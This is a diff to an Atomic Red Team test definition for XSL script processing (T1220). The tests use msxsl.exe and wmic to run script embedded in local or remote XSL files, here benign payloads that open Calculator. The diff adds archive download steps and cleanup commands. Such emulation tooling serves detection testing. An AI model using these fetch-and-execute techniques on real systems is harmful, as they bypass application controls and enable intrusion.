@@ -4,7 +4,10 @@ atomic_tests:
 - name: MSXSL Bypass using local files
   auto_generated_guid: ca23bfb2-023f-49c5-8802-e66997de462d
   description: |
-    Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.
+    Executes the code specified within a XSL script tag during XSL transformation using a local payload. 
+    Requires download of MSXSL. No longer available from Microsoft.
+    (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) 
+    Open Calculator.exe when test successfully executed, while AV turned off.
   supported_platforms:
   - windows
   input_arguments:
@@ -16,6 +19,10 @@ atomic_tests:
       description: Location of the test XSL script file on the local filesystem.
       type: Path
       default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
+    msxsl_exe:
+      description: Location of the MSXSL executable.
+      type: Path
+      default: PathToAtomicsFolder\T1220\bin\msxsl.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -23,23 +30,34 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{xmlfile}) {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction Ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
   - description: |
       XSL file must exist on disk at specified location (#{xslfile})
     prereq_command: |
       if (Test-Path #{xslfile}) {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path #{xslfile}) -ErrorAction Ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
+  - description: |
+      msxsl.exe must exist on disk at specified location (#{msxsl_exe})
+    prereq_command: |
+      if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
   executor:
     command: |
-      C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+      #{msxsl_exe} #{xmlfile} #{xslfile}
+    cleanup_command: | 
+      del #{msxsl_exe} >nul 2>&1
     name: command_prompt
 - name: MSXSL Bypass using remote files
   auto_generated_guid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
   description: |
-    Executes the code specified within a XSL script tag during XSL transformation using a remote payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.
+    Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
+    Requires download of MSXSL.exe. No longer available from Microsoft.
+    (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
+    Open Calculator.exe when test successfully executed, while AV turned off.
   supported_platforms:
   - windows
   input_arguments:
@@ -51,9 +69,23 @@ atomic_tests:
       description: Remote location (URL) of the test XSL script file.
       type: Url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+    msxsl_exe:
+      description: Location of the MSXSL executable.
+      type: Path
+      default: PathToAtomicsFolder\T1220\bin\msxsl.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      msxsl.exe must exist on disk at specified location (#{msxsl_exe})
+    prereq_command: |
+      if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
   executor:
     command: |
-      C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+      #{msxsl_exe} #{xmlfile} #{xslfile}
+    cleanup_command: | 
+      del -Path #{msxsl_exe} >nul 2>&1
     name: command_prompt
 - name: WMIC bypass using local XSL file
   auto_generated_guid: 1b237334-3e21-4a0c-8178-b8c996124988
@@ -64,11 +96,11 @@ atomic_tests:
   input_arguments:
     wmic_command:
       description: WMI command to execute using wmic.exe
-      type: string
+      type: String
       default: process list
     local_xsl_file:
       description: Location of the test XSL script file on the local filesystem.
-      type: path
+      type: Path
       default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
   dependency_executor_name: powershell
   dependencies:
@@ -77,7 +109,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction Ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
   executor:
     command: |
@@ -86,20 +118,19 @@ atomic_tests:
 - name: WMIC bypass using remote XSL file
   auto_generated_guid: 7f5be499-33be-4129-a560-66021f379b9b
   description: |
-    Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test sucessfully executed, while AV turned off.
+    Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.
   supported_platforms:
   - windows
   input_arguments:
     remote_xsl_file:
       description: Remote location of an XSL payload.
-      type: url
+      type: Url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
     wmic_command:
       description: WMI command to execute using wmic.exe
-      type: string
+      type: String
       default: process list
   executor:
     command: |
       wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
     name: command_prompt
-
